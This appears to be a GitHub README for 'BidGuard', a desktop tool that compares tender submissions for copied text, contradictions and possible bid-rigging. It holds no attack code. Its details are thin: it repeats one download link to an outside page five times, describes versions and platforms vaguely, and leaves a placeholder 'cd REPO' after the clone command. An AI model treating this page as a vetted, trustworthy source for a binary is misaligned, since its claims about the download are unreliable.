# BidGuard - Tender Document Analysis & Anti-Collusion Toolkit (2026)

> **BidGuard is an offline-first desktop solution engineered to inspect procurement files locally, flag indicators of bid-rigging or internal contradictions, and assemble verified evidence packages.**

[![Platform](https://img.shields.io/badge/Platform-Desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/eriklorenz84/bidguard-tender-comparison-hub?style=flat-square)](https://github.com/eriklorenz84/bidguard-tender-comparison-hub)

---

<p align="center">
  <a href="https://eriklorenz84.github.io/bidguard-tender-comparison-hub/">
    <img src="https://img.shields.io/badge/Download-BidGuard%20Latest-brightgreen?style=for-the-badge" alt="Download BidGuard">
  </a>
</p>

> **[Download Latest Build](https://eriklorenz84.github.io/bidguard-tender-comparison-hub/)**

---

[Download Latest Build](https://eriklorenz84.github.io/bidguard-tender-comparison-hub/)

---

## What is BidGuard?

Designed specifically for tender evaluators, procurement auditors, and compliance officers, BidGuard streamlines the side-by-side evaluation of multiple vendor submissions. The system accepts anywhere from 2 to 10 files per session, working seamlessly across Microsoft Word documents (DOCX), PDFs, optical character recognition (OCR) image scans, and Excel cost tables.

By merging automated text similarity engines with customized auditing workflows, BidGuard uncovers identical text fragments, numerical discrepancies, and potential collusion patterns. It brings all flagged items into a unified workspace where reviewers can curate evidence, view side-by-side text highlights, and generate standardized compliance reports.

---

## Core Capabilities

- Run simultaneous comparative checks across 2 to 10 tender submissions.
- Uncover copied language, contradictory facts, and suspect collusion patterns.
- Accept DOCX, PDF, scanned image files (via OCR), and Excel spreadsheets.
- Render similarity cross-matrices alongside highlighted side-by-side text comparisons.
- Pinpoint discrepancies across financial figures, dates, timelines, and assigned personnel.
- Manage investigation workflows via **Pending**, **Confirmed**, and **Excluded** status flags.
- Export detailed audit records in HTML, Word, Excel, CSV, Markdown, and JSON formats.
- Run complete analytical workflows locally without sacrificing data privacy.

---

## Setup & Building

### Get the Application

1. Head to the [download page](https://eriklorenz84.github.io/bidguard-tender-comparison-hub/).
2. Grab the desktop installer tailored to your operating system.
3. Complete the setup process or unpack the archive.
4. Launch BidGuard directly from your desktop shortcuts or program directory.

### Compile Source Code

```bash
git clone https://github.com/eriklorenz84/bidguard-tender-comparison-hub.git
cd REPO
```

BidGuard is constructed using Tauri, incorporating a React front-end alongside a Rust back-end. Consult the repository's build guidelines to configure your regional toolchain and target system.

---

## Typical Operating Workflow

1. Start BidGuard and initialize a clean review session.
2. Select between 2 and 10 vendor submission files.
3. Enable OCR processing if your intake includes scanned images or non-searchable PDFs.
4. Inspect the generated similarity matrix and color-coded text matches.
5. Drill down into duplicated phrasing and data conflicts (such as mismatched rates, schedules, or personnel names).
6. Assign appropriate audit statuses (**Pending**, **Confirmed**, or **Excluded**) to each entry.
7. Compile all verified findings into your audit bundle.
8. Output the final summary into your desired reporting format (HTML, Word, Excel, CSV, Markdown, or JSON).

---

## Environment Configuration

Because BidGuard prioritizes complete offline processing, operational parameters, audit states, privacy logs, and export paths are managed directly inside the application's configuration interfaces.

Below is an abstract representation of a session setup:

```text
documents:
  minimum: 2
  maximum: 10

processing:
  ocr_for_scanned_files: enabled
  offline_analysis: enabled

review:
  states:
    - pending
    - confirmed
    - excluded
```

System storage paths and editable values depend on your OS environment and build configuration.

---

## System Requirements

- Compatible desktop platform
- Supported BidGuard application binary
- 2 to 10 bid documents per analysis project
- Sufficient disk capacity for source files, OCR caches, matrix outputs, and export files
- To build locally:
  - Installed Rust toolchain
  - Tauri 2 environment setup
  - Node.js environment with project React dependencies

Supported inputs include DOCX files, PDFs, image-based scans requiring OCR, and Excel sheets.

---

## Frequently Asked Questions

### What is the maximum number of files per evaluation?

You can load and analyze between two and ten bid files within a single evaluation session.

### Are image-only files supported?

Yes, the application integrates OCR capabilities to handle image-only scans and non-searchable documents.

### How are individual audit items triaged?

Each identified item can be assigned a status of **Pending**, **Confirmed**, or **Excluded** to facilitate team triage.

### Which output formats are supported?

Analysis results can be exported to HTML, Microsoft Word, Microsoft Excel, CSV, Markdown, and structured JSON.

### Is an active internet connection required?

No. BidGuard operates offline-first to safeguard sensitive procurement data. Refer to your system build notes for any OS-specific details.

### Where are user preferences saved?

Preferences and project state files are written locally to your hard drive by the desktop binary, following platform-specific path standards.

### How should I handle file parsing or alignment errors?

First, verify that your document type is supported and ensure OCR was executed if the file is an image scan. Double-check the text extraction pane. If issues persist, reduce your workspace to the smallest set of failing files and file a bug report specifying your application version and file formats.

### Where can I find new software releases?

All updated desktop binaries are published on the application's build repository. Visit [Download Latest Build](https://eriklorenz84.github.io/bidguard-tender-comparison-hub/) to retrieve new software releases.

---

## Licensing Terms

Licensed under the GNU General Public License v3.0. Refer to the included [LICENSE](LICENSE) file for complete details.
